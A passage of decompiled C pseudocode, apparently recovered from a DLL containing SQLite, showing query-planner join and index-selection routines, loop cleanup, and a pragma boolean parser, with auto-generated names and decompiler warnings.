    Src = v14;
    v94 = (unsigned int)v15;
    v93 = v16;
    v90 = (int)v14 + 2;
    v100 = (_BYTE *)sub_10078AA4(v4, (int)v14 + 2);
    for ( i = 1; i <= (int)Src; ++i )
    {
      v101 = 0;
      while ( *(_DWORD *)(v94 + 8 * v101) != i )
      {
        if ( ++v101 >= (int)Src )
          goto LABEL_15;
      }
      sub_10077F49(
        v4,
        (int)&v100[i + 1],
        *(unsigned __int8 **)(*(_DWORD *)(40 * *(_DWORD *)(12 * v101 + v93 + 8) + v102[7]) + 12));
      v4 = (int *)v106;
      v6 = v104;
LABEL_15:
      if ( (void *)v101 == Src )
        break;
    }
    v17 = v107;
    sub_1005ABE8((int)v107, 7, *(_DWORD *)(v89 + 20), (int)v100);
    sub_1005ABE8((int)v107, 7, i - 1, (int)(v100 + 1));
    sub_1005AC02(
      v107,
      125,
      v105,
      v98,
      (int)v100,
      *(unsigned __int16 **)(v89 + 24),
      (_BYTE *)(*(_DWORD *)(v89 + 28) != 0 ? -11 : -2));
    v18 = Src;
    *(_DWORD *)(v89 + 28) = 0;
    if ( (int)v18 > 0 )
    {
      v19 = v93 + 8;
      v109 = (_BYTE *)(v94 + 4);
      v93 = (int)v18;
      do
      {
        if ( *v109 )
          sub_10086DE3(v6);
        v109 += 8;
        v19 += 12;
        --v93;
      }
      while ( v93 );
    }
    v20 = v100;
    *(_DWORD *)(v6 + 44) = v105;
    *(_BYTE *)(v6 + 41) = 127;
    *(_DWORD *)(v6 + 48) = v17[3];
    v21 = sub_10078AC8(v106, (int)v20, v90);
    v6 = v104;
    v4 = (int *)sub_100772D1(v21);
    goto LABEL_140;
  }
  if ( (v12 & 0x1000) != 0 )
  {
    v97 = sub_10078A55((int)v4);
    v22 = (char **)sub_10085449((int)v102, v105, -1, a4, 3, 0);
    v23 = sub_10086E8B(v6, v4, v22, v97);
    v24 = *(_DWORD *)((a2 << 6) + a1 + 60);
    v25 = v23;
    sub_1005ABE8((int)v107, 21, v23, v24);
    sub_1005AB66((int)v107, 51, v105, v24, v25);
    sub_10077230((_DWORD *)v106, v25, v105, -1);
    *(_BYTE *)((a2 << 6) + a1 + 73) = -123;
    v4 = v26;
    goto LABEL_140;
  }
  if ( (v12 & 0x2000) != 0 )
  {
    v101 = 133;
    v93 = 0;
    v110 = (_BYTE *)sub_10085449((int)v102, v105, -1, a4, 36, 0);
    v100 = (_BYTE *)sub_10085449((int)v102, v105, -1, a4, 24, 0);
    if ( v103 )
    {
      v27 = v110;
      v110 = v100;
      v100 = v27;
    }
    if ( v110 )
    {
      v28 = *(unsigned __int8 **)v110;
      v82 = *(_DWORD *)(*(_DWORD *)v110 + 12);
      Src = (void *)757804078;
      v29 = sub_10077F0E(&v89, (int)v4, v82);
      sub_1005AB66((int)v107, *((_BYTE *)v87 + *v28 + 3), v105, v98, v29);
      v30 = sub_100772A8((int)v4, 1, v29);
      sub_10078A70(v30, v89);
      sub_10086DE3(v104);
      v6 = v104;
    }
    else
    {
      sub_1005ABE8((int)v107, 2 * (v103 == 0) + 62, v105, v98);
    }
    if ( v100 )
    {
      v31 = *(_DWORD *)v100;
      v32 = ++v4[18];
      v83 = *(unsigned __int8 **)(v31 + 12);
      v89 = v31;
      v93 = v32;
      sub_10077F49(v4, v32, v83);
      if ( *(_BYTE *)v89 == 79 || *(_BYTE *)v89 == 77 )
        v33 = 2 * (v103 == 0) + 78;
      else
        v33 = 2 * (v103 != 0) + 77;
      v101 = v33;
      sub_10086DE3(v104);
      v6 = v104;
      v4 = (int *)v106;
    }
    v34 = v107[3];
    *(_BYTE *)(v6 + 41) = (v103 == 0) + 65;
    *(_DWORD *)(v6 + 44) = v105;
    *(_DWORD *)(v6 + 48) = v34;
    v35 = !v110 && !v100;
    v11 = v101 == 133;
    *(_BYTE *)(v6 + 42) = v35;
    if ( v11 )
      goto LABEL_140;
    v36 = sub_10078A55(v106);
    v97 = v36;
    sub_1005ABE8((int)v107, 60, v105, v36);
    sub_10077230((_DWORD *)v106, v36, v105, -1);
    sub_1005AB66((int)v107, v101, v93, v98, v36);
    sub_1005AE0E((int)v107, 107);
    goto LABEL_110;
  }
  if ( (v12 & 0x30000) != 0 )
  {
    v37 = *(_DWORD **)((a2 << 6) + a1 + 40);
    v38 = *(_DWORD *)((a2 << 6) + a1 + 36);
    v39 = 0;
    v98 = *(_DWORD *)((a2 << 6) + a1 + 52);
    v40 = *(_DWORD *)(v37[2] + 4 * v38);
    v86 = 0;
    v87[0] = 0;
    v87[1] = 64;
    v87[2] = 62;
    v87[3] = 46;
    v87[4] = 43;
    v87[5] = 45;
    v87[6] = 44;
    v88[0] = 133;
    v88[1] = 81;
    v88[2] = 72;
    v111 = v38;
    v91 = 0;
    Src = 0;
    v100 = 0;
    v94 = (unsigned int)v37;
    v101 = v40;
    if ( (a3 & 1) != 0 && (*(_DWORD *)v6 & 0x1000000) != 0 && v37[1] > v38 )
    {
      v39 = 1;
      v91 = 1;
    }
    if ( (*(_DWORD *)v6 & 0x100000) != 0 )
    {
      v100 = (_BYTE *)sub_10085449((int)v102, v105, v40, a4, 24, v37);
      v39 = 1;
    }
    if ( (*(_DWORD *)v6 & 0x200000) != 0 )
    {
      Src = (void *)sub_10085449((int)v102, v105, v101, a4, 36, (_DWORD *)v94);
      v39 = 1;
    }
    v101 = sub_10086F8B((_DWORD *)v6, v4, (int)v102, a4, v39, &v96);
    v95 = *(_DWORD *)(v6 + 28);
    if ( v103 == (*(_BYTE *)(v38 + *(_DWORD *)(v94 + 40)) == 0) )
    {
      v41 = v100;
      v100 = Src;
      Src = v41;
    }
    if ( !Src || (*((_BYTE *)Src + 16) & 0x28) != 0 )
    {
      v42 = 1;
      v94 = 1;
    }
    else
    {
      v94 = 0;
      v42 = 1;
    }
    if ( !v100 || (v11 = (v100[16] & 0x28) == 0, v90 = 0, !v11) )
      v90 = 1;
    if ( Src || (v93 = 0, v38 > 0) )
      v93 = 1;
    v43 = (unsigned __int16 *)v38;
    if ( Src )
    {
      v44 = v101 + v38;
      v91 = *(_DWORD *)(*(_DWORD *)Src + 12);
      sub_10077F49((int *)v106, v44, (unsigned __int8 *)v91);
      for ( j = v91; *(_BYTE *)j == 0x9D || *(_BYTE *)j == 0x9C; j = *(_DWORD *)(j + 8) )
        ;
      v46 = *(_BYTE *)j;
      if ( *(_BYTE *)j == 0x84 )
        v46 = *(_BYTE *)(j + 35);
      if ( v46 != 94 && (v46 <= 0x80u || v46 > 0x83u) )
        sub_1005ABE8((int)v107, 73, v44, v95);
      if ( v96 )
      {
        v47 = (char *)v96 + v111;
        if ( sub_10075A35((unsigned __int8 *)v91, *((_BYTE *)v96 + v111)) == 98 )
          *v47 = 98;
        if ( sub_10076904((char *)v91, *v47) )
          *v47 = 98;
      }
      v38 = v111;
      v43 = (unsigned __int16 *)(v111 + 1);
      v42 = 1;
    }
    else if ( v91 )
    {
      sub_1005ABE8((int)v107, 10, 0, v38 + v101);
      v94 = 0;
      v43 = (unsigned __int16 *)(v38 + 1);
      v93 = 1;
    }
    sub_10086E22((int)v43, (unsigned __int16 *)v96, v106, v101);
    sub_1005AC32(v107, v87[4 * v93 - 1 + 2 * v94 + v103], v98, v95, v101, v43);
    v91 = v38;
    if ( v100 )
    {
      v49 = (int *)v106;
      v50 = v101 + v111;
      v91 = *(_DWORD *)(*(_DWORD *)v100 + 12);
      v48 = v91;
      sub_100772A8(v106, 1, v101 + v111);
      sub_10077F49(v49, v50, (unsigned __int8 *)v48);
      while ( *(_BYTE *)v48 == 0x9D || *(_BYTE *)v48 == 0x9C )
        v48 = *(_DWORD *)(v48 + 8);
      v51 = *(_BYTE *)v48;
      if ( *(_BYTE *)v48 == 0x84 )
        v51 = *(_BYTE *)(v48 + 35);
      if ( v51 != 94 && (v51 <= 0x80u || v51 > 0x83u) )
        sub_1005ABE8((int)v107, 73, v50, v95);
      v52 = (unsigned __int16 *)v96;
      if ( v96 )
      {
        v53 = (char *)v96 + v111;
        if ( sub_10075A35((unsigned __int8 *)v91, *((_BYTE *)v96 + v111)) == 98 )
          *v53 = 98;
        if ( sub_10076904((char *)v91, *v53) )
          *v53 = 98;
      }
      sub_10086E22(v111 + 1, v52, v106, v101);
      v91 = v111 + 1;
      v38 = v111;
      v42 = 1;
    }
    v54 = v107;
    sub_10058EC7(*(_DWORD *)v106, (unsigned int)v96);
    v11 = v100 == 0;
    *(_DWORD *)(v104 + 48) = v54[3];
    if ( v11 && !v38 )
      v42 = 0;
    v55 = v88[v42 * (v103 + 1)];
    if ( v55 != 133 )
    {
      sub_1005AC32(v54, v55, v98, v95, v101, (unsigned __int16 *)v91);
      sub_1005AE0E((int)v54, v90 != v103);
    }
    v56 = sub_10078A55(v106);
    if ( (*(_DWORD *)v104 & 0x300000) != 0 )
    {
      sub_1005AB66((int)v54, 28, v98, v38, v56);
      sub_1005ABE8((int)v54, 73, v56, v92);
    }
    sub_10078A70(v106, v56);
    sub_10086DE3(v104);
    sub_10086DE3(v104);
    if ( !v89 )
    {
      v57 = sub_10078A55(v106);
      v97 = v57;
      sub_1005ABE8((int)v107, 71, v98, v57);
      sub_10077230((_DWORD *)v106, v57, v105, -1);
      sub_1005ABE8((int)v107, 47, v105, v57);
    }
    v58 = v104;
    *(_BYTE *)(v104 + 41) = (v103 == 0) + 65;
    *(_DWORD *)(v58 + 44) = v98;
    v6 = v58;
LABEL_110:
    v4 = (int *)v106;
    goto LABEL_140;
  }
  if ( ((unsigned int)&_ImageBase & v12) != 0 )
  {
    v59 = ++v4[18];
    v91 = 0;
    v90 = 0;
    v98 = v59;
    v101 = 0;
    v100 = (_BYTE *)sub_1005AC63((int)v107);
    v106 = *(_DWORD *)((a2 << 6) + a1 + 40);
    v95 = *(_DWORD *)(v106 + 12);
    v60 = v98;
    *(_BYTE *)((a2 << 6) + a1 + 73) = 3;
    *(_DWORD *)((a2 << 6) + a1 + 76) = v60;
    v61 = *(_DWORD *)(a1 + 24);
    if ( v61 <= 1 )
    {
      v112 = *(_WORD **)(a1 + 8);
    }
    else
    {
      v62 = *v4;
      v93 = v61 - a2 - 1;
      v112 = sub_10059073(v62, 56 * v93 + 64);
      if ( !v112 )
        return a4;
      v63 = v93 + 1;
      v80 = Src;
      v112[1] = v93 + 1;
      *v112 = v63;
      memcpy(v112 + 4, v80, 0x38u);
      v64 = *(_DWORD *)(a1 + 8) + 8;
      if ( v93 >= 1 )
      {
        v96 = v112 + 32;
        v94 = v6 + 104;
        v89 = v93;
        do
        {
          memcpy(v96, (const void *)(v64 + 56 * *(unsigned __int8 *)v94), 0x38u);
          v94 += 64;
          v96 = (char *)v96 + 56;
          --v89;
        }
        while ( v89 );
      }
    }
    v65 = v107;
    v103 = a3 & 8;
    if ( (a3 & 8) == 0 )
    {
      v67 = v4[18] + 2;
      v66 = (unsigned __int8 *)(v4[18] + 1);
      v4[18] = v67;
      v90 = v67;
      v91 = (int)v66;
      sub_1005ABE8((int)v65, 10, 0, (int)v66);
    }
    v96 = 0;
    v104 = sub_1005ABE8((int)v65, 7, 0, v98);
    if ( *(int *)(v95 + 20) > 0 )
    {
      v93 = 0;
      do
      {
        v68 = v93 + *(_DWORD *)(v95 + 28);
        if ( *(_DWORD *)(v68 + 8) == v105 || *(_WORD *)(v68 + 16) == 512 )
        {
          v94 = sub_10087D63(v4, v112, *(_DWORD *)v68, 0, 240);
          if ( v94 )
          {
            if ( !(_WORD)v103 )
            {
              if ( v96 == (void *)(*(_DWORD *)(v95 + 20) - 1) )
                v89 = -1;
              else
                v89 = (int)v96;
              v69 = sub_100772FA(v4, *((_DWORD *)Src + 3), -1, v105, v90);
              sub_1005AC32(v65, 106, v91, v65[3] + 2, v69, (unsigned __int16 *)v89);
            }
            sub_1005ABE8((int)v65, 2, v98, (int)v100);
            if ( *(_BYTE *)(v94 + 7) )
              v101 = 1;
            sub_100883D6(v94);
          }
        }
        v96 = (char *)v96 + 1;
        v93 += 40;
      }
      while ( (int)v96 < *(_DWORD *)(v95 + 20) );
    }
    sub_1005ADFE(v104, v65[3], (int)v65);
    sub_1005ABE8((int)v65, 1, 0, *(_DWORD *)(v6 + 24));
    sub_1005ACAF((int)v65, (int)v100);
    if ( *(int *)(a1 + 24) > 1 )
      sub_10058EC7(*v4, (unsigned int)v112);
    if ( !v101 )
      sub_10086DE3(v6);
  }
  else
  {
    v70 = v103;
    v84 = v98;
    *(_BYTE *)((a2 << 6) + a1 + 73) = byte_100FC5F4[v103];
    v71 = v105;
    *(_DWORD *)((a2 << 6) + a1 + 76) = v105;
    *(_DWORD *)((a2 << 6) + a1 + 80) = sub_1005ABE8((int)v107, byte_100FC5F8[v70], v71, v84) + 1;
    *(_BYTE *)((a2 << 6) + a1 + 74) = 1;
  }
LABEL_140:
  v72 = v102;
  v73 = sub_1008520A((int *)v102[1], v105);
  v74 = v72[7];
  a4 &= ~v73;
  for ( k = v102[5]; k > 0; v74 += 40 )
  {
    if ( (*(_BYTE *)(v74 + 18) & 6) == 0 )
    {
      if ( (a4 & *(_QWORD *)(v74 + 32)) != 0 )
      {
        *(_BYTE *)(a1 + 7) = 1;
      }
      else
      {
        v75 = *(unsigned __int8 **)v74;
        if ( !*(_DWORD *)(v6 + 12) || (v75[2] & 1) != 0 )
        {
          sub_100783F1(v4, v75, v92, 8);
          *(_BYTE *)(v74 + 18) |= 4u;
        }
      }
    }
    --k;
  }
  if ( *(_DWORD *)(v6 + 12) )
  {
    v85 = *(_DWORD *)(v6 + 12);
    v76 = v107;
    *(_DWORD *)(v6 + 36) = v107[3];
    sub_1005ABE8((int)v76, 7, 1, v85);
    sub_100773BA((int)v4);
    v77 = v102;
    v114 = 0;
    for ( m = v102[7]; v114 < v77[5]; m += 40 )
    {
      if ( (*(_BYTE *)(m + 18) & 6) == 0 && (a4 & *(_QWORD *)(m + 32)) == 0 )
      {
        sub_100783F1(v4, *(unsigned __int8 **)m, v92, 8);
        *(_BYTE *)(m + 18) |= 4u;
      }
      ++v114;
    }
  }
  sub_10078A70((int)v4, v97);
  return a4;
}
// 10087208: conditional instruction was optimized away because %Src.4>=1
// 1008739B: variable 'v26' is possibly undefined
// 10000000: using guessed type __int16 _ImageBase;
// 10087D63: using guessed type _DWORD __cdecl sub_10087D63(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (10087D06) --------------------------------------------------------
void __usercall sub_10087D06(unsigned int a1@<esi>, int a2)
{
  unsigned int *v2; // ebx
  unsigned int v3; // edi
  int v4; // [esp+0h] [ebp-4h]

  if ( a1 )
  {
    v4 = 0;
    if ( *(int *)(a1 + 24) > 0 )
    {
      v2 = (unsigned int *)(a1 + 92);
      do
      {
        v3 = *v2;
        if ( *v2 )
        {
          if ( *(_DWORD *)(v3 + 28) )
            sub_10058E74(*(_DWORD *)(v3 + 24));
          sub_10058EC7(a2, v3);
        }
        ++v4;
        v2 += 16;
      }
      while ( v4 < *(_DWORD *)(a1 + 24) );
    }
    sub_100850BD(*(_DWORD *)(a1 + 28));
    sub_10058EC7(a2, a1);
  }
}

//----- (10087D63) --------------------------------------------------------
_DWORD *__cdecl sub_10087D63(int *a1, __int16 *a2, unsigned __int8 *a3, int **a4, __int16 a5)
{
  unsigned int v5; // edi
  _DWORD *v6; // ebx
  bool v7; // zf
  int v8; // edi
  _DWORD *v9; // esi
  int v10; // ecx
  __int16 *v11; // eax
  int v12; // edi
  _DWORD *v13; // esi
  unsigned __int16 *v14; // eax
  int v15; // edx
  int v16; // esi
  int v17; // eax
  int *v18; // eax
  int v19; // eax
  __int16 *v20; // esi
  const char **v21; // esi
  int v23; // eax
  unsigned int v24; // ecx
  unsigned __int16 *v25; // edx
  _DWORD *v26; // edi
  unsigned __int16 *v27; // eax
  int v28; // edi
  __int64 v29; // rax
  int *v30; // esi
  int v31; // ecx
  _DWORD *v32; // [esp+10h] [ebp-A8h]
  _DWORD *v33; // [esp+10h] [ebp-A8h]
  int v34; // [esp+14h] [ebp-A4h]
  int v35; // [esp+18h] [ebp-A0h]
  int v36; // [esp+18h] [ebp-A0h]
  int v37; // [esp+1Ch] [ebp-9Ch]
  int v38; // [esp+1Ch] [ebp-9Ch]
  int *v39; // [esp+20h] [ebp-98h]
  int v40; // [esp+20h] [ebp-98h]
  int v41; // [esp+24h] [ebp-94h]
  int v42; // [esp+28h] [ebp-90h]
  int i; // [esp+2Ch] [ebp-8Ch]
  int v44; // [esp+2Ch] [ebp-8Ch]
  int v45; // [esp+30h] [ebp-88h]
  __int16 *v46; // [esp+34h] [ebp-84h]
  int v47; // [esp+34h] [ebp-84h]
  int *v48; // [esp+38h] [ebp-80h]
  int v49; // [esp+3Ch] [ebp-7Ch]
  BOOL v50; // [esp+3Ch] [ebp-7Ch]
  __int64 v51; // [esp+40h] [ebp-78h]
  int v52; // [esp+48h] [ebp-70h]
  int *v53; // [esp+4Ch] [ebp-6Ch]
  __int64 v54; // [esp+50h] [ebp-68h] BYREF
  int *v55; // [esp+58h] [ebp-60h]
  _DWORD *v56; // [esp+64h] [ebp-54h]
  double v57[5]; // [esp+68h] [ebp-50h] BYREF
  __int64 v58[5]; // [esp+90h] [ebp-28h] BYREF

  v48 = (int *)a1[3];
  if ( *a2 > 64 )
  {
    sub_10059320(a1, "at most %d tables in a join", 64);
    return 0;
  }
  if ( (a5 & 0x80u) == 0 )
    v34 = *a2;
  else
    v34 = 1;
  v5 = ((v34 << 6) + 39) & 0xFFFFFFF8;
  v45 = *a1;
  v6 = sub_1005904B(*a1, v5 + 612);
  v7 = *(_BYTE *)(v45 + 30) == 0;
  v56 = v6;
  if ( !v7 )
    goto LABEL_71;
  v6[6] = v34;
  v6[2] = a2;
  *v6 = a1;
  v8 = (int)v6 + v5;
  v6[5] = sub_1005AC63((int)v48);
  v9 = (_DWORD *)(v8 + 352);
  v52 = v8;
  v6[7] = v8;
  *((_WORD *)v6 + 2) = a5;
  memset((void *)(v8 + 352), 0, 0x104u);
  sub_10085098((_DWORD *)v8, (int)a1, v8 + 352);
  HIDWORD(v54) = 0;
  v55 = a1;
  LODWORD(v54) = sub_10077F78;
  sub_10084F0D((int (__cdecl **)(_DWORD, int))&v54, (int)a3);
  sub_100851CA(v8, a3, 69);
  if ( a3 )
  {
    if ( v34 )
      sub_10076851((int)a3);
    sub_100783F1(a1, a3, v6[5], 8);
  }
  v10 = (int)a2;
  v37 = 0;
  if ( *a2 > 0 )
  {
    v11 = a2 + 10;
    v46 = a2 + 10;
    do
    {
      v9[++*v9] = *((_DWORD *)v11 + 3);
      if ( *(_DWORD *)v11 && (*(_BYTE *)(*(_DWORD *)v11 + 34) & 0x10) != 0 )
      {
        *(_QWORD *)(v8 + 8) |= 1i64 << v37;
        v11 = v46;
      }
      v10 = (int)a2;
      ++v37;
      v11 += 28;
      v46 = v11;
    }
    while ( v37 < *a2 );
  }
  sub_10085562(v8, v10);
  if ( *(_BYTE *)(v45 + 30) )
    goto LABEL_71;
  v51 = -1i64;
  v47 = -1;
  v42 = 0;
  v38 = 0;
  v32 = v6 + 8;
  if ( v34 > 0 )
  {
    while ( 1 )
    {
      v36 = -1;
      memset(v58, 0, sizeof(v58));
      *(double *)&v58[2] = 1.0e99;
      for ( i = 1; i >= 0; --i )
      {
        if ( v36 >= 0 )
          break;
        if ( i )
          v54 = 0i64;
        else
          v54 = v51;
        v41 = v42;
        v16 = (int)&a2[28 * v42 + 4];
        v17 = v42;
        v40 = v16;
        if ( v42 < v34 )
        {
          v53 = &v6[16 * v42 + 23];
          while ( 1 )
          {
            v50 = (*(_BYTE *)(v16 + 21) & 0xA) != 0;
            if ( v41 != v17 && (*(_BYTE *)(v16 + 21) & 0xA) != 0 )
              break;
            if ( (v51 & sub_1008520A((int *)(v8 + 352), *(_DWORD *)(v16 + 24))) != 0 )
            {
              if ( v38 || !a4 )
                v18 = 0;
              else
                v18 = *a4;
              if ( (*(_BYTE *)(*(_DWORD *)(v16 + 12) + 34) & 0x10) != 0 )
              {
                sub_10086731(a1, (int *)v8, v16, v54, v18, v57, v53);
              }
              else
              {
                sub_100868CA((int *)v57, a1, v8, v16, v54, v18);
                v8 = v52;
                v16 = v40;
              }
              if ( (v51 & *(_QWORD *)&v57[4]) == 0 && (v41 == v42 || *(double *)&v58[2] > v57[2]) )
              {
                qmemcpy(v58, v57, sizeof(v58));
                v8 = v52;
                v16 = v40;
                v36 = v41;
              }
              if ( v50 )
                break;
            }
            else if ( v41 == v42 )
            {
              ++v42;
            }
            ++v41;
            v53 += 16;
            v16 += 56;
            v40 = v16;
            if ( v41 >= v34 )
              break;
            v17 = v42;
          }
        }
      }
      v19 = v58[0];
      if ( (v58[0] & 0x1000000) != 0 )
        *a4 = 0;
      v47 &= v19;
      *(_QWORD *)v32 = v58[0];
      v44 = v19 & 0xF0000;
      v32[2] = v58[1];
      if ( (v19 & 0xF0000) != 0 )
        v32[5] = a1[17]++;
      else
        v32[5] = -1;
      v20 = &a2[28 * v36];
      v51 &= ~sub_1008520A((int *)(v52 + 352), *((_DWORD *)v20 + 8));
      *((_BYTE *)v32 + 40) = v36;
      v21 = (const char **)*((_DWORD *)v20 + 15);
      if ( v21 )
      {
        if ( !v44 )
          break;
      }
      ++v38;
      v32 += 16;
      if ( v38 >= v34 )
        goto LABEL_19;
      v8 = v52;
    }
    sub_10059320(a1, "cannot use index: %s", *v21);
    goto LABEL_71;
  }
LABEL_19:
  if ( a1[16] || *(_BYTE *)(v45 + 30) )
  {
LABEL_71:
    sub_10087D06((unsigned int)v6, v45);
    return 0;
  }
  if ( (v47 & 0x4000000) != 0 && a4 )
    *a4 = 0;
  if ( (a5 & 4) != 0 && (v47 & 0x4000000) != 0 )
  {
    v6[8] &= ~0x800000u;
    *((_BYTE *)v6 + 6) = 1;
  }
  sub_1006CAC0(a1, -1);
  v33 = v6 + 8;
  if ( v34 > 0 )
  {
    v49 = v34;
    do
    {
      v12 = *(_DWORD *)&a2[28 * *((unsigned __int8 *)v33 + 40) + 10];
      v39 = (int *)&a2[28 * *((unsigned __int8 *)v33 + 40) + 4];
      v35 = sub_1005855F(v45, *(_DWORD *)(v12 + 68));
      if ( (*(_BYTE *)(v12 + 34) & 2) == 0 && !*(_DWORD *)(v12 + 28) )
      {
        v13 = v33;
        if ( (*v33 & 0x8000000) != 0 )
        {
          v14 = (unsigned __int16 *)sub_10070E9E(v12, v45);
          sub_1005AC02(v48, 124, v39[6], v15, v15, v14, (_BYTE *)0xFFFFFFF6);
        }
        else if ( (*v33 & 0x800000) != 0 || (a5 & 0x10) != 0 )
        {
          sub_10069AEC((int)a1, *(_DWORD *)(v12 + 24), v35, 0, *(_DWORD *)(v12 + 4));
          v6 = v56;
        }
        else
        {
          sub_100791F0(v12, a1, v39[6], v35, (*((_BYTE *)v6 + 6) != 0) + 38);
          if ( !*((_BYTE *)v6 + 6) && *(int *)(v12 + 12) < 64 )
          {
            v23 = v39[10];
            v24 = v39[11];
            v25 = 0;
            while ( v24 | v23 )
            {
              v23 = __PAIR64__(v24, v23) >> 1;
              v24 >>= 1;
              v25 = (unsigned __int16 *)((char *)v25 + 1);
            }
            sub_1005AFA8(v48[3] - 1, v48, v25, (_BYTE *)0xFFFFFFF2);
          }
          v13 = v33;
        }
        v7 = (*v13 & 0xF0000) == 0;
        v13[4] = v39[6];
        if ( !v7 )
        {
          v26 = (_DWORD *)v13[2];
          v27 = (unsigned __int16 *)sub_1006CBB6(a1, v26);
          sub_1005AC02(v48, 38, v13[5], v26[5], v35, v27, (_BYTE *)0xFFFFFFF0);
        }
        sub_1006CAC0(a1, v35);
      }
      v33 += 16;
      --v49;
    }
    while ( v49 );
  }
  v28 = 0;
  v6[3] = v48[3];
  v29 = -1i64;
  if ( v34 > 0 )
  {
    v30 = v6 + 16;
    do
    {
      v29 = sub_1008710B((int)v6, v28, a5, v29);
      v31 = *v30;
      ++v28;
      v30 += 16;
      v6[4] = v31;
    }
    while ( v28 < v34 );
  }
  return v6;
}
// 10088001: variable 'v15' is possibly undefined

//----- (100883D6) --------------------------------------------------------
void __usercall sub_100883D6(unsigned int a1@<eax>)
{
  int *v2; // eax
  int v3; // edi
  int v4; // ebx
  _DWORD *v5; // edi
  char v6; // al
  int v7; // eax
  int *i; // ebx
  unsigned int v9; // edi
  int v10; // eax
  int v11; // ebx
  _DWORD *v12; // eax
  int v13; // ecx
  int v14; // ecx
  _DWORD *v15; // edx
  int v16; // ecx
  int v17; // [esp-4h] [ebp-34h]
  int v18; // [esp+10h] [ebp-20h]
  int v19; // [esp+14h] [ebp-1Ch]
  int v20; // [esp+18h] [ebp-18h]
  int v21; // [esp+1Ch] [ebp-14h]
  int *v22; // [esp+20h] [ebp-10h]
  int j; // [esp+20h] [ebp-10h]
  int v24; // [esp+24h] [ebp-Ch]
  int v25; // [esp+24h] [ebp-Ch]
  int v26; // [esp+24h] [ebp-Ch]
  int v27; // [esp+28h] [ebp-8h]
  int v28; // [esp+28h] [ebp-8h]
  _DWORD *v29; // [esp+2Ch] [ebp-4h]

  v2 = *(int **)a1;
  v3 = *(_DWORD *)(a1 + 8);
  v29 = (_DWORD *)v2[3];
  v20 = v3;
  v21 = *v2;
  sub_100773BA((int)v2);
  v4 = *(_DWORD *)(a1 + 24) - 1;
  v27 = v4;
  if ( v4 >= 0 )
  {
    v22 = (int *)(56 * v4 + v3 + 32);
    v5 = (_DWORD *)((v4 << 6) + a1 + 80);
    do
    {
      sub_1005ACAF((int)v29, *(v5 - 4));
      v6 = *((_BYTE *)v5 - 7);
      if ( v6 != -123 )
      {
        sub_1005ABE8((int)v29, v6, *(v5 - 1), *v5);
        sub_1005AE0E((int)v29, *((_BYTE *)v5 - 6));
      }
      if ( (*(v5 - 12) & 0xF1000) != 0 && (int)v5[1] > 0 )
      {
        sub_1005ACAF((int)v29, *(v5 - 5));
        v7 = v5[1];
        v24 = v7;
        for ( i = (int *)(v5[2] + 8 * v7 - 8); v24 > 0; i -= 2 )
        {
          sub_1005AE20(i[1] + 1, (int)v29);
          sub_1005ABE8((int)v29, 66, *i, i[1]);
          sub_1005AE20(i[1] - 1, (int)v29);
          --v24;
        }
        sub_10058EC7(v21, v5[2]);
        v4 = v27;
      }
      sub_1005ACAF((int)v29, *(v5 - 6));
      if ( *(v5 - 9) )
      {
        v25 = sub_1005ABD1((int)v29, 112, *(v5 - 9));
        if ( (*(v5 - 12) & 0x800000) == 0 )
          sub_1005ABD1((int)v29, 61, *v22);
        if ( (int)*(v5 - 7) >= 0 )
          sub_1005ABD1((int)v29, 61, *(v5 - 7));
        v17 = *(v5 - 3);
        if ( *((_BYTE *)v5 - 7) == 3 )
          sub_1005ABE8((int)v29, 2, *(v5 - 1), v17);
        else
          sub_1005ABE8((int)v29, 1, 0, v17);
        sub_1005AE20(v25, (int)v29);
      }
      v22 -= 14;
      --v4;
      v5 -= 16;
      v27 = v4;
    }
    while ( v4 >= 0 );
  }
  sub_1005ACAF((int)v29, *(_DWORD *)(a1 + 20));
  v28 = 0;
  v9 = a1 + 32;
  while ( v28 < *(_DWORD *)(a1 + 24) )
  {
    v10 = *(_DWORD *)(56 * *(unsigned __int8 *)(v9 + 40) + v20 + 20);
    if ( (*(_BYTE *)(v10 + 34) & 2) == 0 && !*(_DWORD *)(v10 + 28) )
    {
      if ( (*(_BYTE *)(a1 + 4) & 0x20) == 0 )
      {
        if ( !*(_BYTE *)(a1 + 6) && (*(_DWORD *)v9 & 0x800000) == 0 )
          sub_1005ABD1((int)v29, 42, *(_DWORD *)(56 * *(unsigned __int8 *)(v9 + 40) + v20 + 32));
        if ( (*(_DWORD *)v9 & 0xF0000) == 0 )
          goto LABEL_45;
        sub_1005ABD1((int)v29, 42, *(_DWORD *)(v9 + 20));
      }
      if ( (*(_DWORD *)v9 & 0xF0000) != 0 && !*(_BYTE *)(v21 + 30) )
      {
        v11 = *(_DWORD *)(a1 + 12);
        v19 = *(_DWORD *)(v9 + 8);
        v12 = sub_1005B0D5(v11, v29);
        v14 = *(_DWORD *)(v13 + 12);
        if ( v11 < v14 )
        {
          for ( j = v14 - v11; j; --j )
          {
            if ( v12[1] == *(_DWORD *)(v9 + 16) )
            {
              if ( *(_BYTE *)v12 == 28 )
              {
                v26 = 0;
                v18 = *(_DWORD *)(v19 + 4);
                if ( v18 > 0 )
                {
                  v15 = *(_DWORD **)(v19 + 8);
                  while ( v12[2] != *v15 )
                  {
                    ++v26;
                    ++v15;
                    if ( v26 >= v18 )
                      goto LABEL_44;
                  }
                  v12[2] = v26;
                  v16 = *(_DWORD *)(v9 + 20);
                  goto LABEL_43;
                }
              }
              else if ( *(_BYTE *)v12 == 60 )
              {
                v16 = *(_DWORD *)(v9 + 20);
                *(_BYTE *)v12 = 71;
LABEL_43:
                v12[1] = v16;
              }
            }
LABEL_44:
            v12 += 5;
          }
        }
      }
    }
LABEL_45:
    ++v28;
    v9 += 64;
  }
  sub_10087D06(a1, v21);
}
// 100885F1: variable 'v13' is possibly undefined

//----- (10088678) --------------------------------------------------------
char __usercall sub_10088678@<al>(char *a1@<ebx>)
{
  _BYTE *v2; // edi
  int v3; // esi

  if ( (byte_100FEFC0[(unsigned __int8)*a1] & 4) != 0 )
    return j__atol(a1);
  v2 = sub_10059297(a1);
  v3 = 0;
  while ( (_BYTE *)(unsigned __int8)byte_100FC464[v3] != v2
       || sub_100593F9(&aOnoffalseyestr[(unsigned __int8)byte_100FC45C[v3]], (int)v2, (unsigned __int8 *)a1) )
  {
    if ( ++v3 >= 7 )
      return 1;
  }
  return byte_100FC46C[v3];
}

//----- (100886D0) --------------------------------------------------------
int __usercall sub_100886D0@<eax>(unsigned __int8 *a1@<esi>)
{
  int result; // eax
  unsigned int v2; // eax

  result = sub_100593BE(a1, (unsigned __int8 *)aNone);
  if ( result )
  {
